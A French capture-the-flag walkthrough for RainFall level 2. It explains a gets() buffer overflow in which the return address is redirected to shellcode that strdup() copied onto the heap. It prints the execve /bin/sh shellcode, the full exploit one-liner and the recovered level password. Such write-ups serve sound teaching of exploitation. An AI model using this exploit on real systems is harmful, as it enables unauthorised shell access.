# Niveau 2 : Dépassement de tampon avec exécution sur le tas

## Vue d'ensemble du défi

Dans le niveau 2, nous rencontrons un programme qui lit l'entrée utilisateur dans un tampon, puis la copie sur le tas à l'aide de `strdup()`. Le programme inclut un mécanisme de protection qui vérifie si l'adresse de retour a été modifiée pour pointer vers la pile, mais il ne bloque pas la redirection vers le tas.

## Analyse du code source

Le code source de ce niveau révèle la vulnérabilité :

```c
#include <stdio.h>    // Pour fflush, gets, printf, puts
#include <stdlib.h>   // Pour _exit
#include <string.h>   // Pour strdup
#include <unistd.h>   // Alternative pour _exit
#include <stdint.h>   // Pour uint32_t

void p(void);

int main(void)
{
  p();
  return 0;
}

void p(void)
{
  uint32_t return_address;
  char buffer[76];

  // Vider le tampon stdout
  fflush(stdout);

  // Lire l'entrée dans le tampon (vulnérable au dépassement de tampon)
  gets(buffer);

  // Vérifier si l'adresse de retour commence par 0xb0000000 (plage d'adresses de la pile)
  // Ceci est une protection contre les exploits typiques de dépassement de tampon sur la pile
  if ((return_address & 0xb0000000) == 0xb0000000) {
    printf("(%p)\n", return_address);
    /* Le processus se termine ici */
    _exit(1);
  }

  // Répéter l'entrée utilisateur
  puts(buffer);

  // Dupliquer le tampon (alloue de la mémoire sur le tas)
  strdup(buffer);

  return;
}
```

Observations clés :

1. Le programme utilise `gets()`, qui est vulnérable au dépassement de tampon.
2. Il y a une vérification de protection contre les exploits basés sur la pile (adresses commençant par 0xb).
3. La fonction `strdup()` copie notre entrée sur le tas.

## La vulnérabilité

Ce programme présente deux vulnérabilités principales :

1. **Dépassement de tampon** : L'utilisation de `gets()` permet d'écrire au-delà des 76 octets du tampon.
2. **Redirection d'exploit** : Bien qu'il y ait une vérification contre les exploits basés sur la pile, nous pouvons rediriger l'exécution vers le tas, qui a des adresses commençant généralement par 0x8.

## Contournement de la protection

La vérification de protection dans ce programme cible les adresses de la pile :

```c
if ((return_address & 0xb0000000) == 0xb0000000)
```

Cela vérifie si les 4 bits les plus élevés de l'adresse sont 0xb (1011 en binaire). C'est une plage courante pour les adresses de la pile dans les systèmes Linux 32 bits, mais les adresses du tas commencent généralement par 0x8, ce qui nous permet de contourner cette vérification.

## Stratégie d'exploitation

Notre approche utilise la mémoire du tas allouée par `strdup()` :

1. Créer un code d'exploitation avec le shellcode (un code qui nous donne un shell) au début.
2. Laisser `strdup()` copier notre shellcode sur le tas.
3. Déborder le tampon pour écraser l'adresse de retour avec l'adresse du tas.
4. Lorsque la fonction retourne, l'exécution saute à notre shellcode sur le tas.

## Trouver l'adresse du tas

Nous avons utilisé GDB pour trouver où `strdup()` place notre entrée :

```bash
level2@RainFall:~$ gdb -q ./level2
(gdb) disas p
# Recherche de l'instruction ret
0x08048538 <+100>:   call   0x80483e0 <strdup@plt>
0x0804853d <+105>:   leave
0x0804853e <+106>:   ret

(gdb) break *0x0804853e  # Point d'arrêt à l'instruction ret
(gdb) run
# Entrer une chaîne de test
test

Breakpoint 1, 0x0804853e in p ()
(gdb) x/s $eax  # Examiner la chaîne à l'adresse retournée par strdup
0x804a008:       "test"
```

Nous avons découvert que `strdup()` place systématiquement notre entrée à l'adresse `0x804a008` sur le tas.

## Création de l'exploit

Avec ces informations, nous avons conçu un exploit avec :

1. Un shellcode pour lancer un shell.
2. Un remplissage pour remplir le tampon.
3. Une valeur pour écraser l'EBP sauvegardé.
4. L'adresse du tas (0x804a008) pour écraser l'adresse de retour.

### Récupération du shellcode

Pour exécuter `/bin/sh`, nous avions besoin d'un shellcode qui effectue l'appel système `execve`. Au lieu d'écrire le shellcode nous-mêmes, nous avons récupéré un shellcode pré-écrit depuis [Shell-Storm](http://shell-storm.org/shellcode/), un référentiel bien connu pour les shellcodes.

Nous avons recherché "Linux/x86 - execve /bin/sh" sur Shell-Storm et trouvé [un shellcode compact de 21 octets](https://shell-storm.org/shellcode/files/shellcode-575.html) :
```assembly
\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80
```
Ce shellcode lance un shell en invoquant l'appel système `execve` avec `/bin/sh` comme argument.

### Pourquoi gérer l'EBP

Dans le niveau 2, l'EBP sauvegardé (Extended Base Pointer) est situé entre le tampon et l'adresse de retour. Cela diffère du niveau 1, où le tampon est directement suivi par l'adresse de retour. Nous n'avons pas besoin de savoir ce qu'est l'EBP dans le contexte de ce niveau , juste qu'il occupe 4 octets qui doivent être pris en compte dans notre exploit.

#### Différence clé entre le niveau 1 et le niveau 2

- **Niveau 1** :

  ```assembly
  0x08048489 <+9>:     lea    0x10(%esp),%eax  # Le tampon est alloué par rapport à ESP
  ```

  Dans le niveau 1, le tampon est alloué par rapport à ESP (Stack Pointer), et il n'y a pas d'EBP sauvegardé entre le tampon et l'adresse de retour.

- **Niveau 2** :
  ```assembly
  0x080484e7 <+19>:    lea    -0x4c(%ebp),%eax  # Le tampon est alloué par rapport à EBP
  ```
  Dans le niveau 2, le tampon est alloué par rapport à EBP, et l'EBP sauvegardé occupe 4 octets entre le tampon et l'adresse de retour.

#### Ajustement de l'exploit

Pour concevoir l'exploit pour le niveau 2, nous devons :

1. Remplir le tampon de 76 octets.
2. Écraser les 4 octets de l'EBP sauvegardé avec une valeur quelconque (par exemple, "BBBB").
3. Écraser l'adresse de retour avec l'adresse du tas où notre shellcode est stocké. Afin que notre shellcode soit exécuté quand la fonction retourne.

## L'exploit final

```bash
(python -c 'print "\x6a\x0b\x58\x99\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x31\xc9\xcd\x80" + "A"*55 + "BBBB" + "\x08\xa0\x04\x08"'; cat) | ./level2
```

Décomposition :

- Shellcode (21 octets) : `\x6a\x0b\x58...` - Lance /bin/sh et se termine proprement.
- Remplissage (55 octets) : `"A"*55` - Remplit le reste du tampon de 76 octets.
- Écrasement de l'EBP (4 octets) : `"BBBB"` - Valeur arbitraire pour l'EBP sauvegardé.
- Adresse de retour (4 octets) : `\x08\xa0\x04\x08` - 0x804a008 au format little-endian.
- `cat` - Garde stdin ouvert pour l'interaction avec le shell. Consultez le walkthrough du niveau 1 pour plus de détails.

## Obtenir le mot de passe

Après avoir exécuté l'exploit, nous obtenons un shell et pouvons lire le mot de passe :

```bash
cat /home/user/level3/.pass
492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
```

## Passer au niveau suivant

Avec le mot de passe obtenu, nous pouvons maintenant passer au niveau 3 :

```bash
level2@RainFall:~$ su level3
Password: 492deb0e7d14c4b5695173cca843c4384fe52d0857c2b0718e1a521a4d33ec02
level3@RainFall:~$
```

## Leçons retenues

1. **La protection de la pile n'est pas suffisante** : Les vérifications simples sur les adresses de retour peuvent être contournées en utilisant d'autres régions de mémoire comme le tas.

2. **Comprendre la disposition de la mémoire est crucial** : Savoir comment la mémoire est organisée (pile vs tas) permet des techniques d'exploitation créatives.

3. **Fonctions dangereuses** : `gets()` reste dangereux, quelles que soient les vérifications supplémentaires, car il permet une entrée illimitée.

4. **Intégrité du cadre de pile** : Lors de la redirection de l'exécution, gérer correctement le cadre de pile (y compris l'EBP) est important pour des exploits fiables.
